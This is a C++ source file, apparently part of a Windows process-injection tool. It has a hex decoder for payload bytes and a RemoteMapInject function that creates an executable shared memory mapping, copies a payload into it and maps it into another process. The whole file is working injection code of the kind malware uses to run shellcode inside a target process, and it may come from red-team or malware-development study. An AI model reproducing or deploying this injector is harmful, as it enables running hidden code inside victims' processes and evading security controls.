#include "pch.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include "injector.h"


BOOL Injector::hexToBytes(const char* hex, PBYTE buf, SIZE_T bufSize) {

	size_t hexLen = strlen(hex);
	if ((hexLen % 2) != 0) {
		return FALSE;
	}
	size_t byteLen = hexLen / 2;
	if (byteLen > bufSize) {
		return FALSE;
	}

	for (size_t i = 0; i < hexLen; i += 2) {
		char hexArr[3] = { hex[i], hex[i + 1], '\0' };
		std::string hexStr = std::string(hexArr);
		int num = std::stoi(hexStr, nullptr, 16);
		buf[i / 2] = num;
	}
	return TRUE;
}

BOOL Injector::RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL bSTATE = TRUE;
	HANDLE hFile = NULL;
	PVOID pMapLocalAddress = NULL;
	PVOID pMapRemoteAddress = NULL;
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping failed with error : %d \n", GetLastError());
		bSTATE = FALSE; goto _CLEANUP;
	}

	// Maps the view of the payload to the memory 
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile failed with error : %d \n", GetLastError());
		bSTATE = FALSE; goto _CLEANUP;
	}

	// Copying the payload to the mapped memory
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// Maps the payload to a new remote buffer in the target process
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 failed with error : %d \n", GetLastError());
		bSTATE = FALSE; goto _CLEANUP;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_CLEANUP:
	*ppAddress = pMapRemoteAddress;
	if (hFile) {
		CloseHandle(hFile);
	}
	return bSTATE;
}